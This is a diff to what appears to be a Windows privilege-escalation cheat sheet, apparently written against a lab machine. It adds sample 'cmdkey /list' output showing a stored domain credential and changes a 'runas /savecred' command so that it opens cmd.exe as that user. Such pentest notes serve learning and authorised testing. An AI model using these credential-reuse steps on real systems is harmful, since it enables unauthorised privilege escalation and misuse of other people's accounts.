@@ -50,9 +50,17 @@ $ENV:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSreadline\Console
 ```
 cmdkey /list
 ```
+* Sample output.
+```
+Currently stored credentials:
+
+    Target: Domain:interactive=WPRIVESC1\mike.katz
+    Type: Domain Password
+    User: WPRIVESC1\mike.katz
+```
 * Try any "interesting" credentials using `runas`.
 ```
-runas /savecred /user:admin cmd.exe
+runas /savecred /user:mike.katz cmd.exe
 ```
 ## Internet Information Services (IIS) Configuration
 * Default web server on Windows.
